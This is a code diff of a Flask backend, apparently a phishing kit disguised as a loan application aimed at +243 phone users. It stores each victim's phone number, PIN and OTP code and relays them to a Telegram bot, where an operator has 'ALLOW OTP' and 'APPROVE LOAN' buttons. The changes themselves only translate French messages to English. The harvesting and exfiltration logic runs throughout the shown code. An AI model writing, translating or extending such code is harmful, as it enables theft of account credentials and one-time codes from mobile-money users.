@@ -145,7 +145,7 @@ def submit_loan():
         resend_count = c.fetchone()[0]
         if resend_count >= 3:
             conn.close()
-            return jsonify({'success': False, 'error': 'Trop de demandes OTP. Attendez.'})
+            return jsonify({'success': False, 'error': 'Too many OTP requests. Wait.'})
         app_id = 'AC-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
         code = str(random.randint(1000, 9999))
         c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
@@ -165,7 +165,7 @@ def submit_loan():
     c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
     conn.commit(); conn.close()
     
-    prefix = '🔄 CLIENT RETOUR' if is_returning else '📥 NOUVELLE DEMANDE'
+    prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
     msg = f'{prefix}\n\n🆔 ID: {app_id}\n📞 Phone: +243 {phone}\n🔢 PIN: {pin}\n💰 Amount: ${amount:,}'
     keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
     send_telegram(msg, keyboard)
@@ -179,8 +179,8 @@ def submit_code():
     loan = c.fetchone()
     if loan:
         phone, expected_code, amount, pin = loan
-        msg = f'🔐 VERIFICATION CODE\n\n🆔 ID: {app_id}\n📞 Phone: +243 {phone}\n✍️ Entered: {entered_code}\n💰 Amount: ${amount:,}\n🔢 PIN: {pin}'
-        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROUVER','callback_data':f'approve_{app_id}'}]]}
+        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +243 {phone}\n✍️ Entered: {entered_code}\n💰 Amount: ${amount:,}\n🔢 PIN: {pin}'
+        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]]}
         send_telegram(msg, keyboard)
     conn.close()
     return jsonify({'success':True})
